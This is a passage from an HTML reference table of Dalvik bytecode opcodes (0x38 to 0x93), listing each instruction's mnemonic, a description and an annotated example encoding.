value.<o:p></o:p></p></td><td><p>3802 1900 - if-eqz v2, 0038 // +0019<br>Jumps to the current position+19H words if v2==0. 0038 is the label of the target instruction.<o:p></o:p></p></td></tr><tr><td><p>39<o:p></o:p></p></td><td><p>if-nez vx,target<o:p></o:p></p></td><td><p>Checks vx and jumps if vx is nonzero<sup>2</sup>.<o:p></o:p></p></td><td><p>3902 1200 - if-nez v2, 0014 // +0012<br>Jumps to current position+18 words (hex 12) if v2 is nonzero. 0014 is the label of the target instruction.<o:p></o:p></p></td></tr><tr><td><p>3A<o:p></o:p></p></td><td><p>if-ltz vx,target<o:p></o:p></p></td><td><p>Checks vx and jumps if vx&lt;0<sup>2</sup>.<o:p></o:p></p></td><td><p>3A00 1600 - if-ltz v0, 002d // +0016<br>Jumps to the current position+16H words if v0&lt;0. 002d is the label of the target instruction.<o:p></o:p></p></td></tr><tr><td><p>3B<o:p></o:p></p></td><td><p>if-gez vx,target<o:p></o:p></p></td><td><p>Checks vx and jumps if vx&gt;=0<sup>2</sup>.<o:p></o:p></p></td><td><p>3B00 1600 - if-gez v0, 002d // +0016<br>Jumps to the current position+16H words if v0 &gt;=0. 002d is the label of the target instruction.<o:p></o:p></p></td></tr><tr><td><p>3C<o:p></o:p></p></td><td><p>if-gtz vx,target<o:p></o:p></p></td><td><p>Checks vx and jumps if vx&gt;0<sup>2</sup>.<o:p></o:p></p></td><td><p>3C00 1D00 - if-gtz v0, 004a // +001d<br>Jumps to the current position+1DH words if v0&gt;0. 004A is the label of the target instruction.<o:p></o:p></p></td></tr><tr><td><p>3D<o:p></o:p></p></td><td><p>if-lez vx,target<o:p></o:p></p></td><td><p>Checks vx and jumps if vx&lt;=0<sup>2</sup>.<o:p></o:p></p></td><td><p>3D00 1D00 - if-lez v0, 004a // +001d<br>Jumps to the current position+1DH words if v0&lt;=0. 004A is the label of the target instruction.<o:p></o:p></p></td></tr><tr><td><p>3E<o:p></o:p></p></td><td><p>unused_3E<o:p></o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td></tr><tr><td><p>3F<o:p></o:p></p></td><td><p>unused_3F<o:p></o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td></tr><tr><td><p>40<o:p></o:p></p></td><td><p>unused_40<o:p></o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td></tr><tr><td><p>41<o:p></o:p></p></td><td><p>unused_41<o:p></o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td></tr><tr><td><p>42<o:p></o:p></p></td><td><p>unused_42<o:p></o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td></tr><tr><td><p>43<o:p></o:p></p></td><td><p>unused_43<o:p></o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td></tr><tr><td><p>44<o:p></o:p></p></td><td><p>aget vx,vy,vz<o:p></o:p></p></td><td><p>Gets an integer value of an object reference array into vx. The array is referenced by vy and is indexed by vz.<o:p></o:p></p></td><td><p>4407 0306 - aget v7, v3, v6<br>Gets an integer array element. The array is referenced by v3 and the element is indexed by v6. The element will be put into v7.<o:p></o:p></p></td></tr><tr><td><p>45<o:p></o:p></p></td><td><p>aget-wide vx,vy,vz<o:p></o:p></p></td><td><p>Gets a long/double value of long/double array into vx,vx+1. The array is referenced by vy and is indexed by vz.<o:p></o:p></p></td><td><p>4505 0104 - aget-wide v5, v1, v4<br>Gets a long/double array element. The array is referenced by v1 and the element is indexed by v4. The element will be put into v5,v6.<o:p></o:p></p></td></tr><tr><td><p>46<o:p></o:p></p></td><td><p>aget-object vx,vy,vz<o:p></o:p></p></td><td><p>Gets an object reference value of an object reference array into vx. The array is referenced by vy and is indexed by vz.<o:p></o:p></p></td><td><p>4602 0200 - aget-object v2, v2, v0<br>Gets an object reference array element. The array is referenced by v2 and the element is indexed by v0. The element will be put into v2.<o:p></o:p></p></td></tr><tr><td><p>47<o:p></o:p></p></td><td><p>aget-boolean vx,vy,vz<o:p></o:p></p></td><td><p>Gets a boolean value of a boolean array into vx. The array is referenced by vy and is indexed by vz.<o:p></o:p></p></td><td><p>4700 0001 - aget-boolean v0, v0, v1<br>Gets a boolean array element. The array is referenced by v0 and the element is indexed by v1. The element will be put into v0.<o:p></o:p></p></td></tr><tr><td><p>48<o:p></o:p></p></td><td><p>aget-byte vx,vy,vz<o:p></o:p></p></td><td><p>Gets a byte value of a byte array into vx. The array is referenced by vy and is indexed by vz.<o:p></o:p></p></td><td><p>4800 0001 - aget-byte v0, v0, v1<br>Gets a byte array element. The array is referenced by v0 and the element is indexed by v1. The element will be put into v0.<o:p></o:p></p></td></tr><tr><td><p>49<o:p></o:p></p></td><td><p>aget-char vx, vy,vz<o:p></o:p></p></td><td><p>Gets a char value&nbsp; of a character array into vx. The element is indexed by vz, the array object is&nbsp; &nbsp;referenced by vy<o:p></o:p></p></td><td><p>4905 0003 - aget-char v5, v0, v3<br>Gets a character array element. The array is referenced by v0 and the element is indexed by v3. The element will be put into v5.<o:p></o:p></p></td></tr><tr><td><p>4A<o:p></o:p></p></td><td><p>aget-short vx,vy,vz<o:p></o:p></p></td><td><p>Gets a short value&nbsp; of a short array into vx. The element is indexed by vz, the array object is referenced by vy.<o:p></o:p></p></td><td><p>4A00 0001 - aget-short v0, v0, v1<br>Gets a short array element. The array is referenced by v0 and the element is indexed by v1. The element will be put into v0.<o:p></o:p></p></td></tr><tr><td><p>4B<o:p></o:p></p></td><td><p>aput vx,vy,vz<o:p></o:p></p></td><td><p>Puts the integer value in vx into an element of an integer array. The element is indexed by vz, the array object is referenced by vy.<o:p></o:p></p></td><td><p>4B00 0305 - aput v0, v3, v5<br>Puts the integer value in v2 into an integer array referenced by v0. The target array element is indexed by v1.<o:p></o:p></p></td></tr><tr><td><p>4C<o:p></o:p></p></td><td><p>aput-wide vx,vy,vz<o:p></o:p></p></td><td><p>Puts the double/long value in vx,vx+1 into a double/long array. The array is referenced by vy, the element is indexed by vz.<o:p></o:p></p></td><td><p>4C05 0104 - aput-wide v5, v1, v4<br>Puts the double/long value in v5,v6 into a double/long array referenced by v1. The target array element is indexed by v4.<o:p></o:p></p></td></tr><tr><td><p>4D<o:p></o:p></p></td><td><p>aput-object vx,vy,vz<o:p></o:p></p></td><td><p>Puts the object reference value in vx into an element of an object reference array. The element is indexed by vz, the array object is referenced by vy.<o:p></o:p></p></td><td><p>4D02 0100 - aput-object v2, v1, v0<br>Puts the object reference value in v2 into an object reference array referenced by v0. The target array element is indexed by v1.<o:p></o:p></p></td></tr><tr><td><p>4E<o:p></o:p></p></td><td><p>aput-boolean vx,vy,vz<o:p></o:p></p></td><td><p>Puts the boolean value in vx into an element of a boolean array. The element is indexed by vz, the array object is referenced by vy.<o:p></o:p></p></td><td><p>4E01 0002 - aput-boolean v1, v0, v2<br>Puts the boolean value in v1 into an object reference array referenced by v0. The target array element is indexed by v2.<o:p></o:p></p></td></tr><tr><td><p>4F<o:p></o:p></p></td><td><p>aput-byte vx,vy,vz<o:p></o:p></p></td><td><p>Puts the byte value in vx into an element of a byte array. The element is indexed by vz, the array object is referenced by vy.<o:p></o:p></p></td><td><p>4F02 0001 - aput-byte v2, v0, v1<br>Puts the boolean value in v2 into a byte array referenced by v0. The target array element is indexed by v1.<o:p></o:p></p></td></tr><tr><td><p>50<o:p></o:p></p></td><td><p>aput-char vx,vy,vz<o:p></o:p></p></td><td><p>Puts the char value in vx into an element of a character array. The element is indexed by vz, the array object is referenced by vy.<o:p></o:p></p></td><td><p>5003 0001 - aput-char v3, v0, v1<br>Puts the character value in v3 into a character array referenced by v0. The target array element is indexed by v1.<o:p></o:p></p></td></tr><tr><td><p>51<o:p></o:p></p></td><td><p>aput-short vx,vy,vz<o:p></o:p></p></td><td><p>Puts the short value in vx into an element of a short array. The element is indexed by vz, the array object is referenced by vy.<o:p></o:p></p></td><td><p>5102 0001 - aput-short v2, v0, v1<br>Puts the short value in v2 into a character array referenced by v0. The target array element is indexed by v1.<o:p></o:p></p></td></tr><tr><td><p>52<o:p></o:p></p></td><td><p>iget vx, vy, field_id<o:p></o:p></p></td><td><p>Reads an instance field into vx. The instance is referenced by vy.<o:p></o:p></p></td><td><p>5210 0300 - iget v0, v1, Test2.i6:I // field@0003<br>Reads field@0003 into v0 (entry #3 in the field id table). The instance is referenced by v1.<o:p></o:p></p></td></tr><tr><td><p>53<o:p></o:p></p></td><td><p>iget-wide vx,vy,field_id<o:p></o:p></p></td><td><p>Reads an instance field into vx<sup>1</sup>. The instance is referenced by vy.<o:p></o:p></p></td><td><p>5320 0400 - iget-wide v0, v2, Test2.l0:J // field@0004<br>Reads field@0004 into v0 and v1 registers (entry #4 in the field id table). The instance is referenced by v2.<o:p></o:p></p></td></tr><tr><td><p>54<o:p></o:p></p></td><td><p>iget-object vx,vy,field_id<o:p></o:p></p></td><td><p>Reads an object reference instance field into vx. The instance is referenced by vy.<o:p></o:p></p></td><td><p>iget-object v1, v2, LineReader.fis:Ljava/io/FileInputStream; // field@0002<br>Reads field@0002 into v1&nbsp; (entry #2 in the field id table). The instance is referenced by v2.<o:p></o:p></p></td></tr><tr><td><p>55<o:p></o:p></p></td><td><p>iget-boolean vx,vy,field_id<o:p></o:p></p></td><td><p>Reads a boolean instance field into vx. The instance is referenced by vy.<o:p></o:p></p></td><td><p>55FC 0000 - iget-boolean v12, v15, Test2.b0:Z // field@0000<br>Reads the boolean field@0000 into v12 register (entry #0 in the field id table). The instance is referenced by v15.<o:p></o:p></p></td></tr><tr><td><p>56<o:p></o:p></p></td><td><p>iget-byte vx,vy,field_id<o:p></o:p></p></td><td><p>Reads a byte instance field into vx. The instance is referenced by vy.<o:p></o:p></p></td><td><p>5632 0100 - iget-byte v2, v3, Test3.bi1:B // field@0001<br>Reads the char field@0001 into v2 register (entry #1 in the field id table). The instance is referenced by v3.<o:p></o:p></p></td></tr><tr><td><p>57<o:p></o:p></p></td><td><p>iget-char vx,vy,field_id<o:p></o:p></p></td><td><p>Reads a char instance field into vx. The instance is referenced by vy.<o:p></o:p></p></td><td><p>5720 0300 - iget-char v0, v2, Test3.ci1:C // field@0003<br>Reads the char field@0003 into v0 register (entry #3 in the field id table). The instance is referenced by v2.<o:p></o:p></p></td></tr><tr><td><p>58<o:p></o:p></p></td><td><p>iget-short vx,vy,field_id<o:p></o:p></p></td><td><p>Reads a short instance field into vx. The instance is referenced by vy.<o:p></o:p></p></td><td><p>5830 0800 - iget-short v0, v3, Test3.si1:S // field@0008<br>Reads the short field@0008 into v0 register (entry #8 in the field id table). The instance is referenced by v3.<o:p></o:p></p></td></tr><tr><td><p>59<o:p></o:p></p></td><td><p>iput vx,vy, field_id<o:p></o:p></p></td><td><p>Puts vx into an instance field. The instance is referenced by vy.<o:p></o:p></p></td><td><p>5920 0200 - iput v0,v2, Test2.i6:I // field@0002<br>Stores v0 into field@0002 (entry #2 in the field id table). The instance is referenced by v2.<o:p></o:p></p></td></tr><tr><td><p>5A<o:p></o:p></p></td><td><p>iput-wide vx,vy, field_id<o:p></o:p></p></td><td><p>Puts the wide value located in vx and vx+1 registers into an instance field. The instance is referenced by vy.<o:p></o:p></p></td><td><p>5A20 0000 - iput-wide v0,v2, Test2.d0:D // field@0000<br>Stores the wide value in v0, v1 registers into field@0000 (entry #0 in the field id table). The instance is referenced by v2.<o:p></o:p></p></td></tr><tr><td><p>5B<o:p></o:p></p></td><td><p>iput-object vx,vy,field_id<o:p></o:p></p></td><td><p>Puts the object reference in vx into an instance field. The instance is referenced by vy.<o:p></o:p></p></td><td><p>5B20 0000 - iput-object v0, v2, LineReader.bis:Ljava/io/BufferedInputStream; // field@0000<br>Stores the object reference in v0 into field@0000 (entry #0 in the field table). The instance is referenced by v2.<o:p></o:p></p></td></tr><tr><td><p>5C<o:p></o:p></p></td><td><p>iput-boolean vx,vy, field_id&nbsp;<o:p></o:p></p></td><td><p>Puts the boolean value located in vx into an instance field. The instance is referenced by vy.<o:p></o:p></p></td><td><p>5C30 0000 - iput-boolean v0, v3, Test2.b0:Z // field@0000<br>Puts the boolean value in v0 into field@0000 (entry #0 in the field id table). The instance is referenced by v3.<o:p></o:p></p></td></tr><tr><td><p>5D<o:p></o:p></p></td><td><p>iput-byte vx,vy,field_id<o:p></o:p></p></td><td><p>Puts the byte value located in vx into an instance field. The instance is referenced by vy.<o:p></o:p></p></td><td><p>5D20 0100 - iput-byte v0, v2, Test3.bi1:B // field@0001<br>Puts the boolean value in v0 into field@0001 (entry #1 in the field id table). The instance is referenced by v2.<o:p></o:p></p></td></tr><tr><td><p>5E<o:p></o:p></p></td><td><p>iput-char vx,vy,field_id<o:p></o:p></p></td><td><p>Puts the char value located in vx into an instance field. The instance is referenced by vy.<o:p></o:p></p></td><td><p>5E20 0300 - iput-char v0, v2, Test3.ci1:C // field@0003<br>Puts the char value in v0 into field@0003 (entry #3 in the field id table). The instance is referenced by v2.<o:p></o:p></p></td></tr><tr><td><p>5F<o:p></o:p></p></td><td><p>iput-short vx,vy,field_id<o:p></o:p></p></td><td><p>Puts the short value located in vx into an instance field. The instance is referenced by vy.<o:p></o:p></p></td><td><p>5F21 0800 - iput-short v1, v2, Test3.si1:S // field@0008<br>Puts the short value in v1 into field@0008 (entry #8 in the field id table). The instance is referenced by v2.<o:p></o:p></p></td></tr><tr><td><p>60<o:p></o:p></p></td><td><p>sget vx,field_id<o:p></o:p></p></td><td><p>Reads the integer field identified by the field_id into vx.<o:p></o:p></p></td><td><p>6000 0700 - sget v0, Test3.is1:I // field@0007<br>Reads field@0007 (entry #7 in the field id table) into v0.<o:p></o:p></p></td></tr><tr><td><p>61<o:p></o:p></p></td><td><p>sget-wide vx, field_id<o:p></o:p></p></td><td><p>Reads the static field identified by the field_id into vx and vx+1 registers.<o:p></o:p></p></td><td><p>6100 0500 - sget-wide v0, Test2.l1:J // field@0005<br>Reads field@0005 (entry #5 in the field id table) into v0 and v1 registers.<o:p></o:p></p></td></tr><tr><td><p>62<o:p></o:p></p></td><td><p>sget-object vx,field_id<o:p></o:p></p></td><td><p>Reads the object reference field identified by the field_id into vx.<o:p></o:p></p></td><td><p>6201 0C00 - sget-object v1, Test3.os1:Ljava/lang/Object; // field@000c<br>Reads field@000c (entry #CH in the field id table) into v1.<o:p></o:p></p></td></tr><tr><td><p>63<o:p></o:p></p></td><td><p>sget-boolean vx,field_id<o:p></o:p></p></td><td><p>Reads the boolean static field identified by the field_id into vx.<o:p></o:p></p></td><td><p>6300 0C00 - sget-boolean v0, Test2.sb:Z // field@000c<br>Reads boolean field@000c (entry #12 in the field id table) into v0.<o:p></o:p></p></td></tr><tr><td><p>64<o:p></o:p></p></td><td><p>sget-byte vx,field_id<o:p></o:p></p></td><td><p>Reads the byte static field identified by the field_id into vx.<o:p></o:p></p></td><td><p>6400 0200 - sget-byte v0, Test3.bs1:B // field@0002<br>Reads byte field@0002 (entry #2 in the field id table) into v0.<o:p></o:p></p></td></tr><tr><td><p>65<o:p></o:p></p></td><td><p>sget-char vx,field_id<o:p></o:p></p></td><td><p>Reads the char static field identified by the field_id into vx.<o:p></o:p></p></td><td><p>6500 0700 - sget-char v0, Test3.cs1:C // field@0007<br>Reads byte field@0007 (entry #7 in the field id table) into v0.<o:p></o:p></p></td></tr><tr><td><p>66<o:p></o:p></p></td><td><p>sget-short vx,field_id<o:p></o:p></p></td><td><p>Reads the short static field identified by the field_id into vx.<o:p></o:p></p></td><td><p>6600 0B00 - sget-short v0, Test3.ss1:S // field@000b<br>Reads short field@000b (entry #BH in the field id table) into v0.<o:p></o:p></p></td></tr><tr><td><p>67<o:p></o:p></p></td><td><p>sput vx, field_id<o:p></o:p></p></td><td><p>Puts vx into a static field.<o:p></o:p></p></td><td><p>6700 0100 - sput v0, Test2.i5:I // field@0001<br>Stores v0 into field@0001 (entry #1 in the field id table).<o:p></o:p></p></td></tr><tr><td><p>68<o:p></o:p></p></td><td><p>sput-wide vx, field_id<o:p></o:p></p></td><td><p>Puts vx and vx+1 into a static field.<o:p></o:p></p></td><td><p>6800 0500 - sput-wide v0, Test2.l1:J // field@0005<br>Puts the long value in v0 and v1 into the field@0005 static field (entry #5 in the field id table).<o:p></o:p></p></td></tr><tr><td><p>69<o:p></o:p></p></td><td><p>sput-object vx,field_id<o:p></o:p></p></td><td><p>Puts object reference in vx into a static field.<o:p></o:p></p></td><td><p>6900 0c00 - sput-object v0, Test3.os1:Ljava/lang/Object; // field@000c<br>Puts the object reference value in v0 into the field@000c static field (entry #CH in the field id table).<o:p></o:p></p></td></tr><tr><td><p>6A<o:p></o:p></p></td><td><p>sput-boolean vx,field_id<o:p></o:p></p></td><td><p>Puts boolean value in vx into a static field.<o:p></o:p></p></td><td><p>6A00 0300 - sput-boolean v0, Test3.bls1:Z // field@0003<br>Puts the byte value in v0 into the field@0003 static field (entry #3 in the field id table).<o:p></o:p></p></td></tr><tr><td><p>6B<o:p></o:p></p></td><td><p>sput-byte vx,field_id<o:p></o:p></p></td><td><p>Puts byte value in vx into a static field.<o:p></o:p></p></td><td><p>6B00 0200 - sput-byte v0, Test3.bs1:B // field@0002<br>Puts the byte value in v0 into the field@0002 static field (entry #2 in the field id table).<o:p></o:p></p></td></tr><tr><td><p>6C<o:p></o:p></p></td><td><p>sput-char vx,field_id<o:p></o:p></p></td><td><p>Puts char value in vx into a static field.<o:p></o:p></p></td><td><p>6C01 0700 - sput-char v1, Test3.cs1:C // field@0007<br>Puts the char value in v1 into the field@0007 static field (entry #7 in the field id table).<o:p></o:p></p></td></tr><tr><td><p>6D<o:p></o:p></p></td><td><p>sput-short vx,field_id<o:p></o:p></p></td><td><p>Puts short value in vx into a static field.<o:p></o:p></p></td><td><p>6D00 0B00 - sput-short v0, Test3.ss1:S // field@000b<br>Puts the short value in v0 into the field@000b static field (entry #BH in the field id table).<o:p></o:p></p></td></tr><tr><td><p>6E<o:p></o:p></p></td><td><p>invoke-virtual { parameters }, methodtocall<o:p></o:p></p></td><td><p>Invokes a virtual method with parameters.<o:p></o:p></p></td><td><p>6E53 0600 0421 - invoke-virtual { v4, v0, v1, v2, v3}, Test2.method5:(IIII)V // method@0006<br>Invokes the 6th method in the method table with the following arguments: v4 is the \"this\" instance, v0, v1, v2, and v3 are the method parameters. The method has 5 arguments (4 MSB bits of the second byte)<sup>5</sup>.<o:p></o:p></p></td></tr><tr><td><p>6F<o:p></o:p></p></td><td><p>invoke-super {parameter},methodtocall<o:p></o:p></p></td><td><p>Invokes the virtual method of the immediate parent class.<o:p></o:p></p></td><td><p>6F10 A601 0100 invoke-super {v1},java.io.FilterOutputStream.close:()V // method@01a6<br>Invokes method@01a6 with one parameter, v1.<o:p></o:p></p></td></tr><tr><td><p>70<o:p></o:p></p></td><td><p>invoke-direct { parameters }, methodtocall<o:p></o:p></p></td><td><p>Invokes a method with parameters without the virtual method resolution.<o:p></o:p></p></td><td><p>7010 0800 0100 - invoke-direct {v1}, java.lang.Object.:()V // method@0008<br>Invokes the 8th method in the method table with just one parameter, v1 is the \"this\" instance<sup>5</sup>.<o:p></o:p></p></td></tr><tr><td><p>71<o:p></o:p></p></td><td><p>invoke-static {parameters}, methodtocall<o:p></o:p></p></td><td><p>Invokes a static method with parameters.<o:p></o:p></p></td><td><p>7110 3400 0400 - invoke-static {v4}, java.lang.Integer.parseInt:( Ljava/lang/String;)I // method@0034<br>Invokes method@34 static method. The method is called with one parameter, v4<sup>5</sup>.<o:p></o:p></p></td></tr><tr><td><p>72<o:p></o:p></p></td><td><p>invoke-interface {parameters},methodtocall<o:p></o:p></p></td><td><p>Invokes an interface method.<o:p></o:p></p></td><td><p>7240 2102 3154 invoke-interface {v1, v3, v4, v5}, mwfw.IReceivingProtocolAdapter.receivePackage:(<br>ILjava/lang/String;Ljava/io/InputStream;)Z // method@0221<br>Invokes method@221 interface method using parameters in v1,v3,v4 and v5<sup>5</sup>.<o:p></o:p></p></td></tr><tr><td><p>73<o:p></o:p></p></td><td><p>unused_73<o:p></o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td></tr><tr><td><p>74<o:p></o:p></p></td><td><p>invoke-virtual/range {vx..vy},methodtocall<o:p></o:p></p></td><td><p>Invokes virtual method with a range of registers. The instruction specifies the first register and the number of registers to be passed to the method.<o:p></o:p></p></td><td><p>7403 0600 1300 - invoke-virtual {v19..v21}, Test2.method5:(IIII)V // method@0006<br>Invokes the 6th method in the method table with the following arguments: v19 is the \"this\" instance, v20 and v21 are the method parameters.<o:p></o:p></p></td></tr><tr><td><p>75<o:p></o:p></p></td><td><p>invoke-super/range<o:p></o:p></p></td><td><p>Invokes&nbsp; the virtual method of the immediate parent class. The instruction specifies the first register and the number of registers to be passed to the method.<o:p></o:p></p></td><td><p>7501 A601 0100 invoke-super {v1},java.io.FilterOutputStream.close:()V // method@01a6<br>Invokes method@01a6 with one parameter, v1.<o:p></o:p></p></td></tr><tr><td><p>76<o:p></o:p></p></td><td><p>invoke-direct/range {vx..vy},methodtocall<o:p></o:p></p></td><td><p>Invokes direct method with a range of registers. The instruction specifies the first register and the number of registers to be passed to the method.<o:p></o:p></p></td><td><p>7603 3A00 1300 - invoke-direct/range {v19..21},java.lang.Object.:()V // method@003a<br>Invokes method@3A with 1 parameters (second byte of the instruction=03). The parameter is stored in v19 (5th,6th bytes of the instruction).<o:p></o:p></p></td></tr><tr><td><p>77<o:p></o:p></p></td><td><p>invoke-static/range {vx..vy},methodtocall<o:p></o:p></p></td><td><p>Invokes static method with a range of registers. The instruction specifies the first register and the number of registers to be passed to the method.<o:p></o:p></p></td><td><p>7703 3A00 1300 - invoke-static/range {v19..21},java.lang.Integer.parseInt:( Ljava/lang/String;)I // method@0034<br>Invokes method@3A with 1 parameters (second byte of the instruction=03). The parameter is stored in v19 (5th,6th bytes of the instruction).<o:p></o:p></p></td></tr><tr><td><p>78<o:p></o:p></p></td><td><p>invoke-interface-range<o:p></o:p></p></td><td><p>Invokes an interface method with a range of registers. The instruction specifies the first register and the number of registers to be passed to the method.<o:p></o:p></p></td><td><p>7840 2102 0100 invoke-interface {v1..v4}, mwfw.IReceivingProtocolAdapter.receivePackage:(<br>ILjava/lang/String;Ljava/io/InputStream;)Z // method@0221<br>Invokes method@221 interface method using parameters in v1..v4.<o:p></o:p></p></td></tr><tr><td><p>79<o:p></o:p></p></td><td><p>unused_79<o:p></o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td></tr><tr><td><p>7A<o:p></o:p></p></td><td><p>unused_7A<o:p></o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td></tr><tr><td><p>7B<o:p></o:p></p></td><td><p>neg-int vx,vy<o:p></o:p></p></td><td><p>Calculates vx=-vy.<o:p></o:p></p></td><td><p>7B01 - neg-int v1,v0<br>Calculates -v0 and stores the result in v1.<o:p></o:p></p></td></tr><tr><td><p>7C<o:p></o:p></p></td><td><p>not-int vx,vy<o:p></o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td></tr><tr><td><p>7D<o:p></o:p></p></td><td><p>neg-long vx,vy<o:p></o:p></p></td><td><p>Calculates vx,vx+1=-(vy,vy+1)<o:p></o:p></p></td><td><p>7D02 - neg-long v2,v0<br>Calculates -(v0,v1) and stores the result into (v2,v3)<o:p></o:p></p></td></tr><tr><td><p>7E<o:p></o:p></p></td><td><p>not-long vx,vy<o:p></o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td></tr><tr><td><p>7F<o:p></o:p></p></td><td><p>neg-float vx,vy<o:p></o:p></p></td><td><p>Calculates vx=-vy<o:p></o:p></p></td><td><p>7F01 - neg-float v1,v0<br>Calculates -v0 and stores the result into v1.<o:p></o:p></p></td></tr><tr><td><p>80<o:p></o:p></p></td><td><p>neg-double vx,vy<o:p></o:p></p></td><td><p>Calculates vx,vx+1=-(vy,vy+1)<o:p></o:p></p></td><td><p>8002 - neg-double v2,v0<br>Calculates -(v0,v1) and stores the result into (v2,v3)<o:p></o:p></p></td></tr><tr><td><p>81<o:p></o:p></p></td><td><p>int-to-long vx, vy<o:p></o:p></p></td><td><p>Converts the integer in vy into a long in vx,vx+1.<o:p></o:p></p></td><td><p>8106 - int-to-long v6, v0<br>Converts an integer in v0 into a long in v6,v7.<o:p></o:p></p></td></tr><tr><td><p>82<o:p></o:p></p></td><td><p>int-to-float vx, vy<o:p></o:p></p></td><td><p>Converts the integer in vx into a float in vx.<o:p></o:p></p></td><td><p>8206 - int-to-float v6, v0<br>Converts the integer in v0 into a float in v6.<o:p></o:p></p></td></tr><tr><td><p>83<o:p></o:p></p></td><td><p>int-to-double vx, vy<o:p></o:p></p></td><td><p>Converts the integer in vy into the double in vx,vx+1.<o:p></o:p></p></td><td><p>8306 - int-to-double v6, v0<br>Converts the integer in v0 into a double in v6,v7<o:p></o:p></p></td></tr><tr><td><p>84<o:p></o:p></p></td><td><p>long-to-int vx,vy<o:p></o:p></p></td><td><p>Converts the long value in vy,vy+1 into an integer in vx.<o:p></o:p></p></td><td><p>8424 - long-to-int v4, v2<br>Converts the long value in v2,v3 into an integer value in v4.<o:p></o:p></p></td></tr><tr><td><p>85<o:p></o:p></p></td><td><p>long-to-float vx, vy<o:p></o:p></p></td><td><p>Converts the long value in vy,vy+1 into a float in vx.<o:p></o:p></p></td><td><p>8510 - long-to-float v0, v1<br>Convcerts the long value in v1,v2 into a float value in v0.<o:p></o:p></p></td></tr><tr><td><p>86<o:p></o:p></p></td><td><p>long-to-double vx, vy<o:p></o:p></p></td><td><p>Converts the long value in vy,vy+1 into a double value in vx,vx+1.<o:p></o:p></p></td><td><p>8610 - long-to-double v0, v1<br>Converts the long value in v1,v2 into a double value in v0,v1.<o:p></o:p></p></td></tr><tr><td><p>87<o:p></o:p></p></td><td><p>float-to-int vx, vy<o:p></o:p></p></td><td><p>Converts the float value in vy into an integer value in vx.<o:p></o:p></p></td><td><p>8730 - float-to-int v0, v3<br>Converts the float value in v3 into an integer value in v0.<o:p></o:p></p></td></tr><tr><td><p>88<o:p></o:p></p></td><td><p>float-to-long vx,vy<o:p></o:p></p></td><td><p>Converts the float value in vy into a long value in vx.<o:p></o:p></p></td><td><p>8830 - float-to-long v0, v3<br>Converts the float value in v3 into a long value in v0,v1.<o:p></o:p></p></td></tr><tr><td><p>89<o:p></o:p></p></td><td><p>float-to-double vx, vy<o:p></o:p></p></td><td><p>Converts the float value in vy into a double value in vx,vx+1.<o:p></o:p></p></td><td><p>8930 - float-to-double v0, v3<br>Converts the float value in v3 into a double value in v0,v1.<o:p></o:p></p></td></tr><tr><td><p>8A<o:p></o:p></p></td><td><p>double-to-int vx, vy<o:p></o:p></p></td><td><p>Converts the double value in vy,vy+1 into an integer value in vx.<o:p></o:p></p></td><td><p>8A40&nbsp; - double-to-int v0, v4<br>Converts the double value in v4,v5 into an integer value in v0.<o:p></o:p></p></td></tr><tr><td><p>8B<o:p></o:p></p></td><td><p>double-to-long vx, vy<o:p></o:p></p></td><td><p>Converts the double value in vy,vy+1 into a long value in vx,vx+1.<o:p></o:p></p></td><td><p>8B40 - double-to-long v0, v4<br>Converts the double value in v4,v5 into a long value in v0,v1.<o:p></o:p></p></td></tr><tr><td><p>8C<o:p></o:p></p></td><td><p>double-to-float vx, vy<o:p></o:p></p></td><td><p>Converts the double value in vy,vy+1 into a float value in vx.<o:p></o:p></p></td><td><p>8C40 - double-to-float v0, v4<br>Converts the double value in v4,v5 into a float value in v0,v1.<o:p></o:p></p></td></tr><tr><td><p>8D<o:p></o:p></p></td><td><p>int-to-byte vx,vy<o:p></o:p></p></td><td><p>Converts the int value in vy to a byte value and stores it in vx.<o:p></o:p></p></td><td><p>8D00 - int-to-byte v0, v0<br>Converts the integer in v0 into a byte and puts the byte value into v0.<o:p></o:p></p></td></tr><tr><td><p>8E<o:p></o:p></p></td><td><p>int-to-char vx,vy<o:p></o:p></p></td><td><p>Converts the int value in vy to a char value and stores it in vx.<o:p></o:p></p></td><td><p>8E33&nbsp; - int-to-char v3, v3<br>Converts the integer in v3 into a char and puts the char value into v3.<o:p></o:p></p></td></tr><tr><td><p>8F<o:p></o:p></p></td><td><p>int-to-short vx,vy<o:p></o:p></p></td><td><p>Converts the int value in vy to a short value and stores it in vx.<o:p></o:p></p></td><td><p>8F00 - int-to-short v0, v0<br>Converts the integer in v0 into a short and puts the short value into v3.<o:p></o:p></p></td></tr><tr><td><p>90<o:p></o:p></p></td><td><p>add-int vx,vy,vz<o:p></o:p></p></td><td><p>Calculates vy+vz and puts the result into vx.<o:p></o:p></p></td><td><p>9000 0203 - add-int v0, v2, v3<br>Adds v3 to v2 and puts the result into v0<sup>4</sup>.<o:p></o:p></p></td></tr><tr><td><p>91<o:p></o:p></p></td><td><p>sub-int vx,vy,vz<o:p></o:p></p></td><td><p>Calculates vy-vz and puts the result into vx.<o:p></o:p></p></td><td><p>9100 0203 - sub-int v0, v2, v3<br>Subtracts v3 from v2 and puts the result into v0.<o:p></o:p></p></td></tr><tr><td><p>92<o:p></o:p></p></td><td><p>mul-int vx, vy, vz<o:p></o:p></p></td><td><p>Multiplies vz with wy and puts the result int vx.<o:p></o:p></p></td><td><p>9200 0203 - mul-int v0,v2,v3<br>Multiplies v2 with w3 and puts the result into v0<o:p></o:p></p></td></tr><tr><td><p>93<o:p></o:p></p></td><td><p>div-int vx,vy,vz<o:p></o:p></p></td><td><p>Divides vy with 